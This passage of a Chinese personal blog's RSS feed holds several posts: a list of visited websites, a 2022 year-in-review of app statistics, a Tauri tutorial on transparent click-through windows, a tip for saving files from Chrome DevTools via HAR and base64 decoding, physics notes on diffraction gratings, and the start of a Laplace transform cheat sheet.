&lt;li&gt;&lt;strong&gt;D&lt;/strong&gt;eepl.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;E&lt;/strong&gt;&amp;lt;span class=&amp;quot;redacted&amp;quot;&amp;gt;[内网地址，数据删除]&amp;lt;/span&amp;gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;F&lt;/strong&gt;lypy.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;G&lt;/strong&gt;&amp;lt;span class=&amp;quot;redacted&amp;quot;&amp;gt;[内网地址，数据删除]&amp;lt;/span&amp;gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;H&lt;/strong&gt;kuri.cneas.tohoku.ac.jp/project1/manchu/list?groupId=11&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;I&lt;/strong&gt;course163.org&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;J&lt;/strong&gt;&amp;lt;span class=&amp;quot;redacted&amp;quot;&amp;gt;[内网地址，数据删除]&amp;lt;/span&amp;gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;K&lt;/strong&gt;ns.cnki.net/kns8/defaultresult/index&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;L&lt;/strong&gt;eetcode.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;M&lt;/strong&gt;astodon.social&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;N&lt;/strong&gt;otion.so&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O&lt;/strong&gt;3o.ca&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;P&lt;/strong&gt;ortal.office.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Q&lt;/strong&gt;&amp;lt;span class=&amp;quot;redacted&amp;quot;&amp;gt;[数据删除]&amp;lt;/span&amp;gt;.github.io&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;R&lt;/strong&gt;everso.net/文字翻译&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;S&lt;/strong&gt;&amp;lt;span class=&amp;quot;redacted&amp;quot;&amp;gt;[内网地址，数据删除]&amp;lt;/span&amp;gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;T&lt;/strong&gt;witter.com/home&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;U&lt;/strong&gt;.unipus.cn&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;V&lt;/strong&gt;2ex.com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;W&lt;/strong&gt;olframalpha.com&lt;/li&gt;
&lt;li&gt;blog.&lt;strong&gt;X&lt;/strong&gt;inshijiededa.men&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Y&lt;/strong&gt;outube.com/watch?v=&amp;lt;span class=&amp;quot;redacted&amp;quot;&amp;gt;[数据删除]&amp;lt;/span&amp;gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Z&lt;/strong&gt;hihu.com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;lt;style&amp;gt;
.redacted {
color: #bbb;
background-color: #555;
margin-inline-start: 2px;
margin-inline-end: 2px;
padding-left: 2px;
padding-right: 2px;
user-select: none;
-webkit-user-select: none;
transition: color 0.15s ease-out;
}
.redacted:hover {
color: #fff;
}
.post-body &amp;gt; ul &amp;gt; li {
font-family: monospace;
font-size: 120%;
}
&amp;lt;/style&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>2022 Wrapped</title><link>https://blog.xinshijiededa.men/2022/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/2022/</guid><pubDate>Tue, 03 Jan 2023 02:55:28 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;!-- font-awesome --&amp;gt;
&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css&amp;quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/210268661-2915a301-be4b-477a-94a7-b603470d0044.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;每到年底，各种网站或应用的年度总结接踵而来，今年尤其地多，似乎一年的生活完全可以用统计数据来概括。但是也没有心情，抑或是勇气，像我看到的其他许多博主一样，直面过去的一年，写一些类似 &lt;a href=&quot;https://matters.news/@hi176/355892-2022-%E9%A6%AC%E7%89%B9%E5%B8%82%E5%B9%B4%E5%BA%A6%E5%95%8F%E5%8D%B7-10-%E5%80%8B%E5%95%8F%E9%A1%8C-%E8%AB%8B%E5%9B%9E%E7%AD%94-2022-bafybeieapn6vb2h7srvnr2rrexpknskha73z6dppir7br7rwy4cllcbxjy&quot;&gt;馬特市年度問卷&lt;/a&gt; 的回想。或许是没到合适的时间，或许是没有合适的内容……无妨。让巨细靡遗的数据来说话吧。&lt;/p&gt;
&lt;h2&gt;多邻国&lt;/h2&gt;
&lt;p&gt;在 2022 年，我学习了🇰🇷韩语、🇩🇪德语等 13 种语言，共计学习了 &amp;lt;i class=&amp;quot;fa-solid fa-hourglass-start&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 1572 分钟，习得了 &amp;lt;i class=&amp;quot;fa-solid fa-arrow-down-a-z&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 988 个单词，练习了 &amp;lt;i class=&amp;quot;fa-solid fa-align-center&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 2585 个句子，坚持了 128 天的 🔥 streak；获得了 5936 经验，全球排名前 8%。&lt;/p&gt;
&lt;p&gt;&amp;lt;b&amp;gt;&amp;lt;i class=&amp;quot;fa-solid fa-circle-info&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 详细信息，请看 &lt;a href=&quot;/2022/duolingo.html&quot;&gt;我的年度报告&lt;/a&gt;。&amp;lt;/b&amp;gt;&lt;/p&gt;
&lt;h2&gt;Steam&lt;/h2&gt;
&lt;p&gt;在 2022 年，我玩了 &amp;lt;i class=&amp;quot;fa-solid fa-gamepad&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 14 款游戏，解锁了 &amp;lt;i class=&amp;quot;fa-solid fa-star&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 64 项成就。玩的时间最长的是《八方旅人》，占全部游戏时间的 61%，启动了 &amp;lt;i class=&amp;quot;fas fa-play-circle&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 88 次会话。我还在 &amp;lt;i class=&amp;quot;fa-solid fa-city&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 夜之城流连了许久，也意识到 &amp;lt;i class=&amp;quot;fa-solid fa-cat&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 猫比人好。&lt;/p&gt;
&lt;p&gt;&amp;lt;b&amp;gt;&amp;lt;i class=&amp;quot;fa-solid fa-circle-info&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 详细信息，请看 &lt;a href=&quot;/2022/steam.html&quot;&gt;我的 2022 年 STEAM 回顾&lt;/a&gt;。&amp;lt;/b&amp;gt;&lt;/p&gt;
&lt;h2&gt;力扣（LCUS）&lt;/h2&gt;
&lt;p&gt;在 2022 年，我连续 124 天完成了🔥&amp;lt;ruby&amp;gt;力扣每日一题&amp;lt;rt&amp;gt;LeetCode Daily Challenge&amp;lt;/rt&amp;gt;&amp;lt;/ruby&amp;gt;，获得了 9 至 12 月的 Daily Challenge Badge 和 100 Days Badge 2022。在所有比赛中，最好的 ranking 为 &amp;lt;i class=&amp;quot;fa-solid fa-chart-line&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 1,635。&lt;/p&gt;
&lt;p&gt;&amp;lt;b&amp;gt;&amp;lt;i class=&amp;quot;fa-solid fa-circle-info&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 更多信息，请看 &lt;a href=&quot;/2022/leetcode.html&quot;&gt;首页&lt;/a&gt; | &lt;a href=&quot;/2022/leetcode-dark.html&quot;&gt;首页（深色模式）&lt;/a&gt; 存档。&amp;lt;/b&amp;gt;&lt;/p&gt;
&lt;h2&gt;WakaTime&lt;/h2&gt;
&lt;p&gt;在 2022 年，我总计使用了 &amp;lt;i class=&amp;quot;fa-solid fa-hourglass-start&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 783 小时的编辑器，平均每日 2 小时 14 分钟，在 WakaTime 所有用户中排行前 4%。我最活跃的一天是 &amp;lt;i class=&amp;quot;fas fa-calendar-plus&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 4 月 29 日，平均每周最活跃的一天是周日；使用最多的编辑器是 &amp;lt;i class=&amp;quot;fa-solid fa-code&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; VS Code，使用最多的系统是 &amp;lt;i class=&amp;quot;fab fa-windows&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; Windows，使用最多的语言是 &amp;lt;i class=&amp;quot;fa-brands fa-rust&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; Rust 和 &amp;lt;i class=&amp;quot;fa-brands fa-markdown&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; Markdown。&lt;/p&gt;
&lt;p&gt;&amp;lt;b&amp;gt;&amp;lt;i class=&amp;quot;fa-solid fa-circle-info&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 详细信息，请查看我的 &lt;a href=&quot;/2022/wakatime.html&quot;&gt;Code Stats for 2022&lt;/a&gt;。&amp;lt;/b&amp;gt;&lt;/p&gt;
&lt;h2&gt;GitHub&lt;/h2&gt;
&lt;h3&gt;Contributions&lt;/h3&gt;
&lt;p&gt;&amp;lt;div class=&amp;quot;tabset h-center&amp;quot; style=&amp;quot;max-width: 600px;&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;radio&amp;quot; name=&amp;quot;tabset&amp;quot; id=&amp;quot;tab1&amp;quot; aria-controls=&amp;quot;classic&amp;quot; checked&amp;gt;
&amp;lt;label for=&amp;quot;tab1&amp;quot; style=&amp;quot;color: #4e9746;&amp;quot;&amp;gt;Classic&amp;lt;/label&amp;gt;
&amp;lt;input type=&amp;quot;radio&amp;quot; name=&amp;quot;tabset&amp;quot; id=&amp;quot;tab2&amp;quot; aria-controls=&amp;quot;ylgnbu&amp;quot;&amp;gt;
&amp;lt;label for=&amp;quot;tab2&amp;quot; style=&amp;quot;color: #467fb4;&amp;quot;&amp;gt;YlGnBu&amp;lt;/label&amp;gt;
&amp;lt;input type=&amp;quot;radio&amp;quot; name=&amp;quot;tabset&amp;quot; id=&amp;quot;tab3&amp;quot; aria-controls=&amp;quot;purple&amp;quot;&amp;gt;
&amp;lt;label for=&amp;quot;tab3&amp;quot; style=&amp;quot;color: #ec83c2;&amp;quot;&amp;gt;Purple&amp;lt;/label&amp;gt;
&amp;lt;div class=&amp;quot;tab-panels&amp;quot;&amp;gt;
&amp;lt;section id=&amp;quot;classic&amp;quot; class=&amp;quot;tab-panel&amp;quot;&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img loading=&amp;quot;lazy&amp;quot; src=&amp;quot;https://raw.githubusercontent.com/OverflowCat/blog/9d132a41a6a9dbd8b4361392bca72010827d46a8/github-classic.png&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;/section&amp;gt;
&amp;lt;section id=&amp;quot;ylgnbu&amp;quot; class=&amp;quot;tab-panel&amp;quot;&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img loading=&amp;quot;lazy&amp;quot; src=&amp;quot;https://raw.githubusercontent.com/OverflowCat/blog/9d132a41a6a9dbd8b4361392bca72010827d46a8/github-ylgnbu.webp&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;/section&amp;gt;
&amp;lt;section id=&amp;quot;purple&amp;quot; class=&amp;quot;tab-panel&amp;quot;&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img loading=&amp;quot;lazy&amp;quot; src=&amp;quot;https://raw.githubusercontent.com/OverflowCat/blog/9d132a41a6a9dbd8b4361392bca72010827d46a8/github-purple.webp&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;/section&amp;gt;
&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;h3&gt;#GitHubUnwrapped&lt;/h3&gt;
&lt;p&gt;&amp;lt;video controls&amp;gt;
&amp;lt;source src=&amp;quot;https://user-images.githubusercontent.com/20166026/213816411-45ae2a10-fb55-4acc-85c5-484531ad0320.mp4&amp;quot; type=&amp;quot;video/mp4&amp;quot;&amp;gt;
Your browser does not support the video tag.
&amp;lt;/video&amp;gt;&lt;/p&gt;
&lt;h3&gt;Metrics&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/OverflowCat/8b74fbb47a220241462e7a1f1b02b2fc8edd01f4/metrics/general.svg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;Apple Music&lt;/h2&gt;
&lt;p&gt;以下是我的 2022 音乐回忆。&lt;/p&gt;
&lt;p&gt;&amp;lt;style&amp;gt;
div.large {
font-size: 125%;
font-weight: 650;
}
&amp;lt;/style&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/2022-wrapped/apple-music/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;lt;div class=&amp;quot;large&amp;quot;&amp;gt;我已收听 1,641 首歌曲，其中几首最受青睐。&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/2022-wrapped/apple-music/2.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;lt;div class=&amp;quot;large&amp;quot;&amp;gt;我已收听 916 位艺人的歌曲，只有少数人脱颖而出。&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/2022-wrapped/apple-music/3.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&amp;lt;div class=&amp;quot;large&amp;quot;&amp;gt;我已播放 144 张专辑。这些专辑脱颖而出。&amp;lt;/div&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/2022-wrapped/apple-music/4.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;不背单词&lt;/h2&gt;
&lt;p&gt;在 2022 年，我在不背单词学习约 300 天，共学习约 2200 词，使用时长约 5000 分钟，共复习单词约 10000 次。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;i class=&amp;quot;fa-sharp fa-solid fa-arrow-pointer&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 也可以看看 &lt;a href=&quot;/watched-in-2022/&quot;&gt;我的 2022 观影记录&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;lt;style&amp;gt;
.tabset &amp;gt; input[type=&amp;quot;radio&amp;quot;] {
position: absolute;
left: -200vw;
}
.tabset .tab-panel {
display: none;
}
.tabset &amp;gt; input:first-child:checked ~ .tab-panels &amp;gt; .tab-panel:first-child,
.tabset &amp;gt; input:nth-child(3):checked ~ .tab-panels &amp;gt; .tab-panel:nth-child(2),
.tabset &amp;gt; input:nth-child(5):checked ~ .tab-panels &amp;gt; .tab-panel:nth-child(3),
.tabset &amp;gt; input:nth-child(7):checked ~ .tab-panels &amp;gt; .tab-panel:nth-child(4),
.tabset &amp;gt; input:nth-child(9):checked ~ .tab-panels &amp;gt; .tab-panel:nth-child(5),
.tabset &amp;gt; input:nth-child(11):checked ~ .tab-panels &amp;gt; .tab-panel:nth-child(6) {
display: block;
}
/* Styling */
.tabset {
font: 14px/1.25em &amp;quot;Overpass&amp;quot;, &amp;quot;Open Sans&amp;quot;, Helvetica, sans-serif;
}
.tabset &amp;gt; label {
position: relative;
display: inline-block;
padding: 15px 15px 25px;
border: 1px solid transparent;
border-bottom: 0;
cursor: pointer;
font-weight: 600;
}
.tabset &amp;gt; label::after {
content: &amp;quot;&amp;quot;;
position: absolute;
left: 15px;
bottom: 10px;
width: 30px;
height: 4px;
background: #8d8d8d;
}
.tabset &amp;gt; label:hover,
.tabset &amp;gt; input:focus + label {
color: #cccccc;
}
.tabset &amp;gt; label:hover::after,
.tabset &amp;gt; input:focus + label::after,
.tabset &amp;gt; input:checked + label::after {
background: #cccccc;
}
.tabset &amp;gt; input:checked + label {
border-color: #ccc;
border-bottom: 1px solid #fff;
margin-bottom: -1px;
}
.tab-panel {
padding: 30px 0;
border-top: 1px solid #ccc;
}
&amp;lt;/style&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>我的 2022 观影记录</title><link>https://blog.xinshijiededa.men/watched-in-2022/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/watched-in-2022/</guid><pubDate>Sat, 31 Dec 2022 23:54:42 GMT</pubDate><content:encoded>&lt;p&gt;import Index from &amp;quot;./_index.astro&amp;quot;;&lt;/p&gt;
&lt;p&gt;&amp;lt;Index /&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>在 Tauri 中实现鼠标穿透和透明窗口</title><link>https://blog.xinshijiededa.men/tauri-transparent-window/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/tauri-transparent-window/</guid><pubDate>Thu, 29 Dec 2022 21:18:34 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/209962263-969d24a5-eef3-49d8-b446-98b581bc4296.png&quot; alt=&quot;效果&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本文测试通过的 Tauri 版本为 &lt;code&gt;1.0&lt;/code&gt; 和 &lt;code&gt;1.2&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tauri-apps/tauri-docs/335bab9ee7443bc31da1b1e8e26ede47ab25943a/static/img/index/header_light.svg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;鼠标穿透&lt;/h2&gt;
&lt;h3&gt;依赖&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;cargo.toml&lt;/code&gt; 中添加&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-toml&quot;&gt;windows = { version = &amp;quot;0.43.0&amp;quot;, features = [
    &amp;quot;Win32_Foundation&amp;quot;,
    &amp;quot;Win32_UI_WindowsAndMessaging&amp;quot;,
] }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;p&gt;初始化窗口时通过 &lt;code&gt;setup&lt;/code&gt; 传闭包拿到 &lt;code&gt;window&lt;/code&gt; 进行操作。只支持 Windows。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;tauri::Builder::default()
    .setup(|app| {
        let window = app.get_window(&amp;quot;main&amp;quot;).unwrap();
        #[cfg(windows)]
        {
            use windows::Win32::Foundation::HWND;
            let hwnd = window.hwnd().unwrap().0;
            let hwnd = HWND(hwnd);
            unsafe {
                let mut style_ex = WINDOW_EX_STYLE(GetWindowLongW(hwnd, GWL_EXSTYLE) as u32);
                style_ex |= WS_EX_APPWINDOW // for taskbar
                | WS_EX_COMPOSITED
                | WS_EX_LAYERED
                | WS_EX_TRANSPARENT
                | WS_EX_TOPMOST;
                use windows::Win32::UI::WindowsAndMessaging::*;
                let nindex = GWL_EXSTYLE;
                let _pre_val = SetWindowLongA(hwnd, nindex, style_ex.0 as i32);
            }
        }
        Ok(())
    })
    .invoke_handler(tauri::generate_handler![...])
    .run(tauri::generate_context!())
    .expect(&amp;quot;error while running tauri application&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;官方的实现目前&lt;a href=&quot;https://github.com/tauri-apps/tauri/issues/2090&quot;&gt;还没有进入&lt;/a&gt; tauri，只能先凑合用用。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hi, since &lt;a href=&quot;https://github.com/tauri-apps/tao/pull/421&quot;&gt;tauri-apps/tao#421&lt;/a&gt; was merged into &lt;code&gt;tao&lt;/code&gt;, can that function be exposed in tauri&apos;s api?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;透明窗口&lt;/h2&gt;
&lt;h3&gt;窗口设置&lt;/h3&gt;
&lt;p&gt;为了实现透明窗口，还需要修改 &lt;code&gt;tauri.config.json&lt;/code&gt;。当然，直接修改 window 或者通过 &lt;code&gt;tauri::Builder&lt;/code&gt; 应该也是可以的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;&amp;quot;tauri&amp;quot;: {
    …,
    &amp;quot;windows&amp;quot;: [
      {
        &amp;quot;fullscreen&amp;quot;: true,
        &amp;quot;resizable&amp;quot;: false,
        &amp;quot;transparent&amp;quot;: true,
        &amp;quot;alwaysOnTop&amp;quot;: true
      }
    ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;CSS&lt;/h3&gt;
&lt;p&gt;另外，不要忘记修改需要透明的地方的 CSS。如果你使用了 SvelteKit 模板，可以在 &lt;code&gt;+layout.svelte&lt;/code&gt; 中添加：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;&amp;lt;style&amp;gt;
main {
    background: transparent;
}
&amp;lt;/style&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上。🪟&lt;/p&gt;
</content:encoded></item><item><title>射箭之歌</title><link>https://blog.xinshijiededa.men/song-of-archery/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/song-of-archery/</guid><description>🎵在浮躁的人世间，有你我渺小的身影🎶</description><pubDate>Mon, 26 Dec 2022 16:24:00 GMT</pubDate><content:encoded>&lt;p&gt;import Lyrics from &amp;quot;./_lyrics.astro&amp;quot;;&lt;/p&gt;
&lt;p&gt;&amp;lt;Lyrics /&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>下载 Chrome 开发者工具「网络」面板中的文件</title><link>https://blog.xinshijiededa.men/download-files-in-devtools/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/download-files-in-devtools/</guid><description>Chrome 开发者工具的「网络」面板可以查看所有的网络请求。讨厌的是，Chrome 没有提供在列表内直接下载对应的响应的功能。</description><pubDate>Mon, 26 Dec 2022 13:47:52 GMT</pubDate><content:encoded>&lt;p&gt;Chrome 开发者工具的「网络」面板可以查看所有的网络请求。&lt;code&gt;fetch&lt;/code&gt; 发送的请求不会出现在「源代码」面板中，只能通过「网络」里下载。讨厌的是，Chrome 没有提供在列表内直接下载对应的响应的功能，双击对应的请求仍然只会在新标签页重新发送请求，而不是下载已抓取的资源。若远程服务器上的资源已失效，则无法成功下载。虽然可以直接通过「响应」查看内容，但若请求是 binary，则可能包含非法的 Unicode 位点，无法通过复制粘贴将内容正确地保存到本地。&lt;/p&gt;
&lt;p&gt;此时，可以通过右键任意一请求，点选菜单最下方「以 HAR 格式保存所有内容」或点击如下所示的下载按钮保存 HAR。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/209518112-363973c9-ccca-412c-889c-05f6b530bf01.png&quot; alt=&quot;保存 HAR&quot;&gt;&lt;/p&gt;
&lt;p&gt;HAR 实质是 JSON。通过文本编辑器打开下载的 HAR 文件，依据「标头」-「响应标头」中的 &lt;code&gt;Content-Length&lt;/code&gt; 查找到对应的请求内容，即可在 &lt;code&gt;content &amp;gt; text&lt;/code&gt; 中看到 Base64 编码的 response 内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/20166026/209519101-4785d3ec-3d06-476f-849e-1afb31384a18.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;此时我们可以安心地将内容复制出来，解码即可。推荐使用命令行工具。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import base64
from codecs import open

with open(&amp;quot;b64.txt&amp;quot;, &amp;quot;r&amp;quot;) as f:
    content = base64.b64decode(f.read())
print(content)

with open(&amp;quot;out.txt&amp;quot;, &amp;quot;wb&amp;quot;) as f:
    f.write(content)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意若用 Python 处理，写入文件的内容不一定是合法字符串，故 &lt;code&gt;open&lt;/code&gt; 的参数需要为 &lt;code&gt;wb&lt;/code&gt;，否则会有 &lt;code&gt;TypeError: write() argument must be str, not bytes&lt;/code&gt;。&lt;/p&gt;
</content:encoded></item><item><title>光栅衍射</title><link>https://blog.xinshijiededa.men/diffraction-grating/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/diffraction-grating/</guid><description>光栅是刻有平行等宽、等距狭缝的平面玻璃或金属片。</description><pubDate>Mon, 26 Dec 2022 01:49:21 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;&amp;lt;i class=&amp;quot;fa-solid fa-arrows-turn-to-dots&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; &lt;strong&gt;消歧义&lt;/strong&gt;：本页面中的「光栅」指的是刻有平行等宽、等距狭缝的平面玻璃或金属片，而非「栅格化」．&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/d/da/Density_plot_of_diffraction_grating.jpg&quot; alt=&quot;衍射条纹&quot;&gt;&lt;/p&gt;
&lt;h2&gt;光栅常数&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;光栅&lt;/strong&gt;是刻有平行等宽、等距狭缝的平面玻璃或金属片．缝的宽度用 $a$ 表示，非缝部位的宽度用 $b$ 表示，相邻两缝的中心线的距离用 $d$ 表示，称为&lt;strong&gt;光栅常数&lt;/strong&gt;，有 $d=a+b$．&lt;/p&gt;
&lt;h3&gt;例题&lt;/h3&gt;
&lt;p&gt;一个每毫米有 $800$ 条刻线的光栅的光栅常数为 $d=\dfrac 1 {800} = 1.25\times 10^{-6}\mathrm m$．&lt;/p&gt;
&lt;h2&gt;主极大&lt;/h2&gt;
&lt;p&gt;$$d\sin \theta=\pm k\lambda, k=0,1,2…$$&lt;/p&gt;
&lt;p&gt;此描述光栅结构与光的入射角和衍射角之间关系的公式即为&lt;strong&gt;光栅方程&lt;/strong&gt;．其中 $\theta$ 为衍射角，即波衍射时行进方向与法线之间的角度． $\lambda$ 为光线的波长． $k$ 向下取整，即 $k = \big[\dfrac {d\sin\theta}\lambda\big]\approx\big[\dfrac{a+b}\lambda\big]$ 为主极大的最大极数．加上 0 级主极大，一共有 $2[k]+1$ 个主极大．&lt;/p&gt;
&lt;p&gt;近似后，有角位置 $\theta=\dfrac{k\lambda}d$ ，线位置 $x=\theta\cdot f=fk\dfrac \lambda d$ ．&lt;/p&gt;
&lt;h3&gt;例题&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;用波长为 $\lambda$ 的单色平行光垂直入射在一块多缝光栅上，其光栅常数 $d = 3 \mathrm{mm}$ ，缝宽 $a = 1 \mathrm{mm}$ ，则在单缝衍射的中央明条纹中共有______条谱线（主极大）．&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本题缺级从 $k=3$ 开始，因此中央明条纹中有 $0$，$±1$，$±2$ 共五条谱线．&lt;/p&gt;
&lt;h2&gt;缺级&lt;/h2&gt;
&lt;p&gt;除了双缝干涉，光栅间还会发生单缝衍射，部分明条纹会不见，即为 &lt;strong&gt;缺级&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;$$k=\dfrac{d}{a}k&apos;,k=1,2,3…$$&lt;/p&gt;
&lt;p&gt;第 $\pm k$ 级会发生缺级．&lt;/p&gt;
</content:encoded></item><item><title>拉普拉斯变换速查表</title><link>https://blog.xinshijiededa.men/laplace-transform-cheatsheet/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/laplace-transform-cheatsheet/</guid><pubDate>Fri, 16 Dec 2022 22:16:47 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;&amp;lt;i class=&amp;quot;fa-solid fa-infinity&amp;quot;&amp;gt;&amp;lt;/i&amp;gt; 本表是&lt;strong&gt;动态列表&lt;/strong&gt;。动态列表是指&lt;strong&gt;未完成的列表&lt;/strong&gt;。它也许永远不会被完整地完成。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;lt;picture style=&amp;quot;margin:24px;&amp;quot;&amp;gt;
&amp;lt;source srcset=&amp;quot;https://raw.githubusercontent.com/OverflowCat/blog/4571def89a28dea9a549678b2f58be7f3743fe5d/l-on-blackboard.webp&amp;quot; type=&amp;quot;image/webp&amp;quot;&amp;gt;
&amp;lt;source srcset=&amp;quot;https://user-images.githubusercontent.com/20166026/208291325-61a663c7-dac4-4ae6-b41c-b2b0a53905fe.png&amp;quot; type=&amp;quot;image/jpeg&amp;quot;&amp;gt;
&amp;lt;img src=&amp;quot;https://user-images.githubusercontent.com/20166026/208291325-61a663c7-dac4-4ae6-b41c-b2b0a53905fe.png&amp;quot; style=&amp;quot;max-width:210px!important;&amp;quot; alt=&amp;quot;黑板上的字母L。这是一幅AI生成的画作。&amp;quot;&amp;gt;
&amp;lt;/picture&amp;gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;时域 $f(t)$&lt;/th&gt;
&lt;th&gt;频域 $F(s)=\mathscr L[f(t)]$&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
